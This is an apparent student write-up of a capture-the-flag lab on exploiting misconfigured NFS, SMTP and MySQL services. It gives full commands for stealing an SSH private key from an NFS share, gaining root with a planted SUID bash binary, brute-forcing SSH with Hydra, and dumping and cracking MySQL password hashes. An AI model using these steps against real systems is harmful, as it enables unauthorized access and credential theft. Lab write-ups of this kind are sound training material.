# Network Services 2  
🔍 **Enumerating and Exploiting More Common Network Services & Misconfigurations**  

📅 **Date:** 2025-03-22

🖥️ **Category:** Network Services, Penetration Testing  
🎯 **Objective:** Identify and exploit misconfigurations in common network services  


## 🛠 1️⃣ Enumerating Network File System (NFS)  
### 🔎 **Scanning for Open Ports**  

The first step of enumeration is to conduct a port scan to find out as much information as we can about the services, open ports and operating system of the target machine.

I am going to scan for open ports using an nmap scan.

**Command used:**
```bash
nmap -p- --open <target-IP>
```

**Findings:**

![Screenshot (143)](https://github.com/user-attachments/assets/67458606-c6c6-4c28-9a49-4fb278b6ef65)

1. There are 7 open ports.
2. Port 2049 contains the service we want to enumerate.

Now I used the command below to list the NFS shares

**Command used:**
```bash
/usr/sbin/showmount -e <target-IP>
```

**Findings:**

![Screenshot (144)](https://github.com/user-attachments/assets/269a3670-f6e5-4265-bb7c-6120b2d8685a)

1. The name of the visible share found is /home.

Now we want to mount the share to our local machine. Firstly, I make create a directory that I will mount my share to using *mkdir /tmp/mount*. My client system needs a directory where all the content shared by the host server in the export folder can be accessed, and we have created this directory, it is called tmp.

I then mounted the NFS share to my local machine.

**Command used:**
```bash
sudo mount -t nfs 10.10.10.71:/home /tmp/mount/ -nolock
```
I then changed directory to where I mounted this share.

**Findings:**

![Screenshot (145)](https://github.com/user-attachments/assets/00208cc0-df51-40aa-94cb-73b4320f10d2)

1. The name of the folder inside this directory is cappucino.

![Screenshot (146)](https://github.com/user-attachments/assets/4d91018c-9aff-478f-8e0a-8c74180a7ee7)

I took a look insde this directory and looked at the files. It looks like we are inside a user's home directory.


I did a bit of resesarch inside these folders and found that one folder, *.ssh*, could contain keys that would give us remote access to the server.

![Screenshot (147)](https://github.com/user-attachments/assets/161d2868-ae4c-4d36-81cf-70a6fffaa6d9)

Of these keys, the one that is most useful to us is the *id_rsa* one.

I then copied this file to a different location (/root) on my local machine, and changed the permissions to 600.

**Command used:**
```bash
cp id_rsa/root
```
```bash
chmod 600 /root/id_rsa
```
I then listed the contents of the root directory to see if indeed the file was copied there and it was.

![Screenshot (149)](https://github.com/user-attachments/assets/eb733f47-3be5-4ea2-8322-116709629625)

I pretty much easily worked out the name of the user this key belongs to because recall how we got to this id_rsa file before. The private key was found in a directory structure like this:

```bash
/tmp/mount/cappucino/.ssh/id_rsa
```
Therefore, the username is the one that comes before /.ssh and that is cappucino.
Thus I logged into the machine using the command below:

```bash
ssh -i id_rsa cappucino@<target-IP>
```
**Findings:**

![Screenshot (150)](https://github.com/user-attachments/assets/bb86c071-4374-405a-9322-d45821c0e816)
![Screenshot (152)](https://github.com/user-attachments/assets/8fc6a37d-f692-485a-85b8-bfd226825f53)

I successfully logged into the machine!


## 📤 3️⃣ Exploiting NFS

To expoit the NFS share, I first have to change directory to the mount point on my machine, and then into the user's home directory. Remember we established that the user's username is cappucino.

![Screenshot (153)](https://github.com/user-attachments/assets/416b021f-38e2-4fb8-aade-8d3091f68011)

We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!
I changed directory to *.ssh* as I was still here because this is where we find the *id_rsa* key.

To download the executable to my Downloads directory, I used the command below:

**Command:**
```bash
scp -i key_name username@10.10.36.95:/bin/bash ~/Downloads/bash
```
I then used the below command to copy the bash executable to the NFS share. During the enumeration stage, we found the NFS share to be /home.
```bash
cp ~/Downloads/bash /home
```
The copied bash shell must be owned by the root user so I set this using:
```bash
sudo chown root /home/bash
```

**Findings:**

![Screenshot (154)](https://github.com/user-attachments/assets/e7bbe6ad-e8a9-4108-936c-6fb640b20d5e)

Lastly, as the screenshot above shows, I had to verify ownership by listing the contents in the /home/bash directory and indeed the bash shell is owned by a root user.


Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using *sudo chmod +s bash*. And after setting these permissions I used *ls -la /home/bash* to check the permissions of the bash executable. The permissions were successfully set.

![Screenshot (155)](https://github.com/user-attachments/assets/f35b5a4c-3456-49f0-9d7d-fd0b6e3a76b2)

I then ran the bash executable, changed to the /root directory, listed what was in it and ran the root.txt file. Note that upon running the *whoami* command, I received root as the output.

**Commands used:**

```bash
./bash -p
whoami
cd /root
ls (returned root.txt)
cat root.txt
```

**Findings:**

![Screenshot (353)](https://github.com/user-attachments/assets/b96f4618-4e03-4192-a98b-22aaec2bd80c)

root.txt retturned the flag above.



## 📡 4️⃣ Enumerating Simple Mail Tranfer Protocol (SMTP)

Poorly configured or vulnerable mail servers can often provide an initial foothold into a network.  We're going to use the "smtp_version" module in MetaSploit to do this.
First, we'll run a port scan to search for open ports.

**Command used:**
```bash
nmap -p- --opne <target-IP>
```

**Findings:**

![Screenshot (209)](https://github.com/user-attachments/assets/cca9b13a-f0f2-4d31-8dc0-dce7a0ea9898)

SMTP is running on port 25.

Now that we know which port we will be targeting, we will start up Metasploit.
**Command used:**
```bash
msfconsole
```
I then searched for the smtp_version using the command below:

```bash
search smtp_version
```

**Findings:**

![Screenshot (210)](https://github.com/user-attachments/assets/fd104917-6e38-4e85-a6a6-45caf5be8371)

The smtp_version's full module name is auxiliary/scanner/smtp/smtp_version

Now, we will select the module and show its options.

**Command used:**

```bash
use auxilliary/scanner/smtp/smtp_version
```
And 

```bash
show options
```
![Screenshot (212)](https://github.com/user-attachments/assets/2c3118ac-1450-47e5-aafe-2f3ccb29a2af)

We need to set the RHOSTS option as it is the most important for SMTP enumeration.
I will set it to the correct value of the target machine using the below command. Once set, run using the *run* command.

**Command used:**
```bash
set RHOSTS <taget-IP>
```
**Findings:**

![Screenshot (214)](https://github.com/user-attachments/assets/d5e4238c-4284-4ead-bc57-477a7e365cfb)

1. The system mail name is polosmtp.home.
2. The Mail Tranfer Agent (MTA) that is running the SMTP server is Postfix.


We've now got a good amount of information on the target system to move onto the next stage. Now we search for the module "smtp_enum".

**Command used:**
```bash
search smtp_enum
```

**Findings:**

![Screenshot (215)](https://github.com/user-attachments/assets/fc4150fd-6a9f-4251-aa2f-48894a329315)

Its full module name is auxiliary/scanner/smtp/smtp_enum.


We're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames). When one is using an SMTP enumeration module in Metasploit (like smtp_enum), and wants to provide a custom wordlist, they'll need to set the USER_FILE option to the path of that wordlist. Once we have set this option, another essential parameter we have to set is RHOSTS, I set it before I set the option as the below screenshot shows. RHOSTS is crucial because *smtp_enum* needs to know which host(s) to scan.

![Screenshot (216)](https://github.com/user-attachments/assets/0a3578fc-ca2b-4d01-94aa-f4b29433b7fa)

Now, we run the exploit using *run*.



![Screenshot (217)](https://github.com/user-attachments/assets/6164771a-ef0a-42a7-80c3-cc34ffa4fd01)

The username returned to us is *administrator*.


## ✉️ 5️⃣ Exploiting SMTP

Okay, at the end of our Enumeration section we have a few vital pieces of information:

1. A user account name
2. The type of SMTP server and Operating System running.

We know from our port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.

**Command used:**
```bash
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.30.206 ssh
```

**Findings:**

![Screenshot (218)](https://github.com/user-attachments/assets/d685ff74-c40a-476f-a189-a5fe30fb5125)

1. The password of the user (administrator) is alejandro.

Now, we will SSH into the server as the user to look at the contents of the smtp.txt file.

**Command used:**

```bash
ssh administrator@<target-IP>
```

Once I was in, I typed the *ls* command to view what was in the current directory. I did find the *smtp.txt* file, then viewed its contents by using the *cat* command.

**Findings:**

![Screenshot (219)](https://github.com/user-attachments/assets/9da80776-ecf0-48a6-b9b9-c6137107e267)

The contents of smtp.txt file are: THM{who_knew_email_servers_were_c00l?}.

## 🧮 6️⃣ Enumerating My Structured Query Language (MySQL) 

As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that I found the *credentials: "root:password"* while enumerating subdomains of a web server. 

As always, we will start by doing a port scan, so we know what port the service we're trying to attack is running on.

**Command used:**

```bash
nmap -p- --open <target-ip>
```

**Findings:**

![Screenshot (221)](https://github.com/user-attachments/assets/0319d94f-c744-4628-800f-6123d8a903de)

1. MySQL is using the 3306 port.

Now, I will launch up Metasploit using the *msfconsole* command and will be using the mysql_sql module.

I searched for, selected and listed the options it needs.

**Command used for searching:**

```bash
search mysql_sql
```

**Command used for selection and listing options:**

```bash
use auxiliary/admin/mysql/mysql_sql
```

AND

```bash
show options
```

**Findings:**

![Screenshot (271)](https://github.com/user-attachments/assets/fda1311f-8c1d-4d9a-9ced-f59a86719ca1)

![Screenshot (272)](https://github.com/user-attachments/assets/61480913-65d3-4831-b31c-c2b85490b420)

The three options that we need to set (in descending order) are: PASSWORD/RHOSTS/USERNAME

![screenshot(273)(1)](https://github.com/user-attachments/assets/34dfa9b8-c98a-48fc-b367-2aba28ea1dad)

I then ran the exploit.

**Findings:**

![Screenshot (273)](https://github.com/user-attachments/assets/4ce824cf-2639-47bb-ace2-e38c4e3a5437)

By default, it tests with the "select version()" command and the result it gave me was: 5.7.29-0ubuntu0.18.04.1.

Now that we know the exploit is landing as planned, I will try to gain some more ambitious information. I changed the "sql" option to "show databases" and ran it.

![Screenshot (274)](https://github.com/user-attachments/assets/63cb90c0-0994-4617-be33-5ef47a5f5e17)

Four databases were returned.

## 🛠️ 7️⃣ Exploiting MySQL 


The data we are going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format.

First, I will search for and select the "mysql_schemadump" module.

![Screenshot (336)](https://github.com/user-attachments/assets/5048dbf0-a703-47f3-979d-70bea2a95324)

The module's full name is *auxiliary/scanner/mysql/mysql_schemadump*.

Now, I will move on to set the relevant options, and run the exploit.

**Commands used:**

```bash
use auxiliary/scanner/mysql/mysql_schemadump
```

```bash
show options
```

```bash
set RHOSTS <target-IP>
set USERNAME root
set PASSWORD password
```

```bash
run
```

**Findings:**

![Screenshot (337)](https://github.com/user-attachments/assets/b122ed04-4afc-443e-98ff-0cc937cd6193)

Several tables were returned of which the last one's name was *x$waits_global_by_latency*.

I have now dumped the tables, the column names of the whole database. But I can do better - search for and select the "mysql_hashdump" module.

![Screenshot (338)](https://github.com/user-attachments/assets/022ca50f-aafc-4d32-99b1-2a827fc7ebe1)

The module's full name is *auxiliary/scanner/mysql/mysql_hashdump*.

Again, I will set the options like I did previously and run the exploit.

**Findings:**

![Screenshot (339)](https://github.com/user-attachments/assets/c2cb25c5-1307-418e-947c-ab73d9ae4dd5)

The non-default user that stands out is *carl* and we have their password hash. Their hash string in full is carl:*EA031893AA21444B170FC2162A56978B8CEECE18.

Now we need to crack the password. We will try John the Ripper against it using: *john hash.txt*.
I first had to create the file *hash.txt* using nano, then copied carl's full hash in the file.

```bash
nano hash.txt
```
After saving this nano script, I then ran *john hash.txt*.

**Findings:**

![Screenshot (340)](https://github.com/user-attachments/assets/855b066a-e9de-409c-9cac-54d0779c19fb)

Carl's password is doggie.


Now with all this information at hand, I want to check if carl resused this password in other services. One way I checked for this is by logging into the *ssh* service using their credentials.

**Command used:**

```bash
ssh carl@<target-IP>
```

**Findings:**

![Screenshot (351)](https://github.com/user-attachments/assets/cf86bc1c-625f-4e14-8243-ecc17182304a)

I was able to log into this service using the *doggie* password. I wanted to see what was in it using the *ls* command and I found the "MySQL.txt" file that I also looked into. I found the flag!

![Screenshot (352)](https://github.com/user-attachments/assets/e81bd38b-dd30-4939-8f85-2e815b191ae7)



